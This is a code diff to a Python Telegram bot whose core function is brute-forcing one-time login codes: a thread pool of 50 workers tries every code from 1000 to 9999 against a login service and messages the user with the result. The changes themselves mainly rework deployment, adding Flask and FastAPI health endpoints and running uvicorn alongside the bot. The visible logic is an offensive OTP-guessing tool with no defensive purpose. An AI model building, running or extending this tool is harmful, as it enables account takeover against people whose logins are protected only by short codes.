@@ -19,11 +19,19 @@ HEADERS = {
     "Content-Type": "application/json"
 }
 
-# Flask app for Koyeb deployment
+# Flask for health check
 flask_app = Flask(__name__)
 
-# FastAPI for handling OTP brute-force in async
+@flask_app.route('/health')
+def health():
+    return "OK", 200
+
+# FastAPI for OTP checking
 fastapi_app = FastAPI()
+
+@fastapi_app.get("/")
+async def root():
+    return {"message": "FastAPI is running"}
 
 async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.message.text
@@ -116,7 +124,7 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
         with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
             future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}
 
-            for i, future in enumerate(concurrent.futures.as_completed(future_to_otp)):
+            for future in concurrent.futures.as_completed(future_to_otp):
                 if found_otp:
                     executor.shutdown(wait=False)
                     break
@@ -133,24 +141,31 @@ async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await bot.send_message(chat_id, "❌ OTP brute-force failed. Could not find correct OTP.")
 
-@flask_app.route('/')
-def home():
-    return "Bot is Running!"
-
-async def main():
+async def start_telegram_bot():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_login))
-    print("🤖 Bot is running...")
+    print("🤖 Telegram Bot is running...")
 
     await app.initialize()
     await app.start()
     await app.updater.start_polling()
     await asyncio.Event().wait()
 
+async def run_fastapi():
+    config = uvicorn.Config("main:fastapi_app", host="0.0.0.0", port=8000, log_level="info")
+    server = uvicorn.Server(config)
+    await server.serve()
+
+async def main():
+    await asyncio.gather(
+        start_telegram_bot(),
+        run_fastapi()
+    )
+
 if __name__ == "__main__":
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(main())
 
-    # Start Flask for Koyeb health checks
+    # Start Flask for health checks on port 8080
     flask_app.run(host="0.0.0.0", port=8080)
